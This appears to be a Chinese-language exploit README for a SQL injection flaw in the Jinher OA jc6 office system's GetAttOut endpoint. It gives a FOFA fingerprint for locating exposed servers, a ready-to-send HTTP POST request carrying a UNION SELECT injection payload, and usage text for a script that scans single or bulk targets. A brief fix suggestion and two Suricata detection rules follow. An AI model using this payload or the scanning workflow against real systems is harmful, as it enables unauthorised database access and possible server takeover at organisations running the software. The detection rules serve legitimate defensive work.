### 产品简介  
金和OA协同办公管理系统j6软件是一种综合性的协同办公解决方案，旨在提高企业内部的协作效率和工作效率。它提供了一系列功能和工具，帮助组织进行任务管理、日程安排、文件共享、团队协作和沟通等方面的工作。  

### 漏洞概述  
金和 OA jc6 /jc6/JHSoft.WCF/TEST/GetAttOut接口处存在SQL注入漏洞，攻击者不仅可以利用 SQL 注入漏洞获取数据库中的敏感信息，还可以向服务器中写入恶意木马或者执行命令远程下载后门，获取服务器系统权限。  

### 指纹识别  
fofa: app="Jinher-OA"  

![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_jc6_GetAttOut_SQL_injection/1.png)
![Image text](https://github.com/YUUKI4O4/POC/blob/main/%E9%87%91%E5%92%8C/Jinhe_OA_jc6_GetAttOut_SQL_injection/2.png)

### 漏洞利用  
```
poc:
POST /jc6/JHSoft.WCF/TEST/GetAttOut HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 149

1' union select null,CHAR(118)+CHAR(117)+CHAR(108)+ISNULL(CAST(222*3 AS NVARCHAR(4000)),CHAR(32))+CHAR(118)+CHAR(117)+CHAR(108),null,null,null,null--
```

### 测试和利用脚本  
```
python3 Jinhe_OA_jc6_GetAttOut_SQL_injection.py -h
usage: jinhe_oa.py [-h] [-t] [-r FILE] [-u URL]

### Jinhe OA jc6 GetAttOut SQL injection vulnerability. ###

options:
  -h, --help            show this help message and exit
  -t, --target_collection
                        Perform target collection
  -r FILE, --multi_objective_testing FILE
                        Perform multi-objective testing. e.g:python Jinhe_OA_jc6_GetAttOut_SQL_injection.py -r ./url.txt
  -u URL, --single_objective_testing URL
                        Perform single-objective testing. e.g:python Jinhe_OA_jc6_GetAttOut_SQL_injection.py -u http://xxx.xxx.xxx
```

### 修复建议  
1.联系相关软件厂商更新至最新安全版本。  

### Suricata rules  
```
alert http any any -> any any (msg:"Jinhe OA jc6 GetAttOut SQL injection vulnerability."; flow:established,to_server; flowbits:set,Jinhe_OA_jc6_GetAttOut_SQL_injection; content:"post";http_method;nocase; content:"/jc6/JHSoft.WCF/TEST/GetAttOut";http_uri;fast_pattern;nocase; content:"'";nocase;http_client_body; content:"--";nocase;http_client_body;distance:0; pcre:"/(?:S(?:HOW.+(?:C(?:HARACTER.+SET|UR(DATE|TIME))|(?:VARI|T)ABLES)|ELECT.+(?:FROM|USER))|U(?:NION.+SELEC|PDATE.+SE)T|DELETE.+FROM|INSERT.+INTO)/Pi"; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_jc6_GetAttOut_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:19; rev:1;)
alert http any any -> any any (msg:"Jinhe OA jc6 GetAttOut SQL injection vulnerability success."; flow:established,from_server; flowbits:isset,Jinhe_OA_jc6_GetAttOut_SQL_injection; content:"200";http_stat_code; content:"attOEndTime";http_server_body;nocase; content:"attOBeginTime";http_server_body;nocase; content:"attOReason";http_server_body;nocase; content:"success";http_server_body;nocase; content:"1";http_server_body;nocase;distance:0; reference:url,https://github.com/YUUKI4O4/POC/tree/main/%E9%87%91%E5%92%8C/Jinhe_OA_jc6_GetAttOut_SQL_injection; classtype:web-attck; metadata:created_at 2024-01-15,updated_at 2024-01-15,creater:YUUKI4O4; sid:20; rev:1;)
```
